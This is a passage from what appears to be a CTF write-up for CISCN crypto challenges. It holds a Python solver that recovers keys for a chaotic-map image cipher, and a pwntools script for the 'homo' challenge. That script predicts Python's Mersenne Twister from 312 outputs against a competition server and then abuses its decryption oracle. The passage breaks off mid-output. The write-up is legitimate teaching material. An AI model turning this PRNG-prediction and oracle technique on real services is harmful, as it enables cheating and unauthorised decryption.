class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">temp = []</span><br><span class="line">cipher1 = []</span><br><span class="line">cipher2 = []</span><br><span class="line">f = open(<span class="string">&quot;out&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readline()[<span class="number">1</span>:<span class="number">-2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    temp.append(int(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:<span class="number">-2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher1.append(int(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:<span class="number">-2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher2.append(int(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(temp) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> len(cipher1) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> len(cipher2) == <span class="number">24</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    plain.append(temp[i] ^ cipher1[i] ^ cipher2[i])</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    ans = temp[i] ^ cipher1[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line">    ans = plain[i] ^ cipher2[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = 1.2</span></span><br><span class="line"><span class="comment"># key_pair = (78 or 177) &amp; (86 or 169)</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line"></span><br><span class="line">bin_x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_x)</span></span><br><span class="line"></span><br><span class="line">bin_xx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_xx)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> bin_x == bin_xx</span><br><span class="line"><span class="keyword">assert</span> len(bin_x)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> len(bin_xx)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_x)//<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    x = int(bin_x[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>],<span class="number">2</span>)</span><br><span class="line">    data = round(x/<span class="number">22000</span>,<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span>(int(data*<span class="number">22000</span>) == x):</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(int(round(data<span class="number">-0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span class="line">        data = round(data<span class="number">-0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(int(round(data+<span class="number">0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span class="line">        data = round(data+<span class="number">0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> int(x_list[i]*<span class="number">22000</span>) == x</span><br><span class="line"></span><br><span class="line">print(x_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x,r</span>):</span></span><br><span class="line">    <span class="keyword">return</span> round(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_r</span>(<span class="params">data</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    r = round(data[<span class="number">0</span>] / round((data[<span class="number">1</span>]*(<span class="number">3</span>-data[<span class="number">1</span>])),<span class="number">6</span>),<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">&quot;R:&quot;</span>,r)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)<span class="number">-1</span>):</span><br><span class="line">        print(i,generate(data[i],r),data[i+<span class="number">1</span>],(generate(data[i],r)-data[i+<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">r = get_r(x_list)</span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        x = generate(x,r)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(int(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = bin(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-len(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(len(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m) <span class="keyword">for</span> j <span class="keyword">in</span> range(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = int(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">finalplain = encrypt(cipher2,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>)</span><br><span class="line">print(plain)</span><br><span class="line">print(finalplain)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44]</span></span><br><span class="line"><span class="string">[136, 62, 185, 178, 49, 197, 213, 2, 251, 5, 178, 24, 142, 87, 151, 2, 198, 218, 15, 151, 74, 80, 235, 156, 39, 95, 35, 98, 83, 221, 45, 106, 103, 2, 216, 120, 68, 182, 140, 224, 170, 154, 117, 191, 170, 103, 98, 118, 58, 46, 175, 128, 240, 52, 228, 101, 247, 177, 125, 39, 101, 154, 246, 39, 100, 251, 244, 23, 23, 71, 172, 145, 123, 174, 79, 243, 61, 143, 24, 25, 144, 118, 181, 126, 49, 237, 182, 20, 115, 42, 36, 80, 0, 21, 255, 191, 152, 172, 240, 174, 101, 91, 57, 62, 187, 207, 82, 46, 238, 234, 4, 164, 171, 142, 128, 132, 234, 26, 105, 153, 165, 30, 167, 76, 203, 232, 218, 82, 247, 214, 247, 15, 8, 156, 139, 27, 3, 180, 224, 252, 194, 158, 77, 178, 248, 136, 193, 247, 92, 55, 196, 189, 67, 35, 185, 48, 215, 179, 179, 225, 132, 148, 9, 138, 103, 227, 140, 61, 89, 217, 229, 99, 215, 63, 100, 133, 222, 139, 81, 15, 149, 236, 168, 7, 102, 176, 173, 240, 149, 70, 244, 23, 243, 248, 208, 6, 156, 241, 12, 62, 45, 49, 136, 168, 187, 217, 70, 142, 94, 227, 122, 92, 209, 177, 195, 217, 218, 105, 41, 157, 66, 119, 67, 31, 130, 120, 52, 32, 18, 49, 34, 17, 145, 170, 89, 38, 27, 102, 52, 42, 65, 161, 182, 114, 194, 205, 16, 53, 139, 167, 115, 92, 87, 210, 95, 44, 210, 63, 158, 223, 183, 161, 91, 36, 201, 53, 92, 222, 105, 246, 80, 94, 170, 10, 132, 110, 0, 151, 77, 91, 209, 110, 100, 206, 195, 88, 103, 183, 7, 98, 163, 42, 44, 115, 82, 184, 200, 122, 56, 188, 106, 159, 221, 166, 213, 81, 162, 64, 116, 213, 43, 32, 5, 223, 135, 182, 64, 54, 111, 218, 126, 75, 92, 205, 231, 15, 8, 66, 34, 52, 115, 246, 96, 227, 92, 211, 76, 204, 217, 20, 239, 144, 139, 90, 136, 142, 197, 83, 43, 96, 248, 76, 17, 70, 13, 49, 18, 69, 95, 31, 198, 181, 32, 119, 253, 42, 73, 70, 106, 29, 38, 20, 232, 108, 244, 219, 72, 144, 109, 146, 32, 250, 83, 99]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(map(chr,finalplain))</span><br><span class="line">print(data)</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+md5.new(data).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h4><p>拿312次随机数，就能还原<code>states</code>，接着预判接下来的200次<code>win</code>了之后即可<code>decrypt</code>，由于系数不能完全相同，给其加上个模数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> poly <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;124.71.229.150&quot;</span>, <span class="string">&quot;23474&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_coefficient</span>():</span></span><br><span class="line">    data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">    coefficient = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        coefficient.append(int(i))</span><br><span class="line">    <span class="keyword">return</span> coefficient</span><br><span class="line"></span><br><span class="line">q = <span class="number">2</span>**<span class="number">54</span></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">data1 = get_coefficient()</span><br><span class="line">data2 = get_coefficient()</span><br><span class="line">data3 = get_coefficient()</span><br><span class="line">data4 = get_coefficient()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RightXor</span>(<span class="params">value,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RightXorMasked</span>(<span class="params">value,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftXor</span>(<span class="params">value, shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftXorMasked</span>(<span class="params">value, shift, mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = value</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">        tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_state</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = RightXor(x,<span class="number">18</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">15</span>,<span class="number">4022730752</span>)</span><br><span class="line">    x = LeftXorMasked(x,<span class="number">7</span>,<span class="number">2636928640</span>)</span><br><span class="line">    x = RightXor(x,<span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play_game</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    my_states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">312</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">&quot;my number is &quot;</span>)</span><br><span class="line">        num = bin(int(r.recvline(<span class="literal">False</span>).strip().decode()))[<span class="number">2</span>:]</span><br><span class="line">        num1,num2 = int(num[<span class="number">-32</span>:],<span class="number">2</span>),int(num[:<span class="number">-32</span>],<span class="number">2</span>)</span><br><span class="line">        my_states.append(get_state(num1))</span><br><span class="line">        my_states.append(get_state(num2))</span><br><span class="line">    <span class="keyword">assert</span> len(my_states) == <span class="number">624</span></span><br><span class="line">    print(<span class="string">&quot;my_states ready!&quot;</span>)</span><br><span class="line">    my_random = Random()</span><br><span class="line">    my_random.setstate((<span class="number">3</span>,tuple(my_states+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">312</span>):</span><br><span class="line">        my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;your number:&quot;</span>)</span><br><span class="line">        x = my_random.getrandbits(<span class="number">64</span>)</span><br><span class="line">        r.sendline(str(x))</span><br><span class="line">        r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">play_game()</span><br><span class="line">print(<span class="string">&quot;Win!&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;2.decrypt\n\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;c0:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data3)<span class="number">-1</span>):</span><br><span class="line">    r.send(str(data3[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(str(data3[<span class="number">-1</span>]+q))</span><br><span class="line">r.recvuntil(<span class="string">&quot;c1:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data4)<span class="number">-1</span>):</span><br><span class="line">    r.send(str(data4[i])+<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">r.sendline(str(data4[<span class="number">-1</span>]+q))</span><br><span class="line"></span><br><span class="line">finaldata = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> finaldata:</span><br><span class="line">    flag += i</span><br><span class="line">flag = int(flag,<span class="number">2</span>)</span><br><span class="line">print(flag)</span><br><span class="line">print(long_to_bytes(flag))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 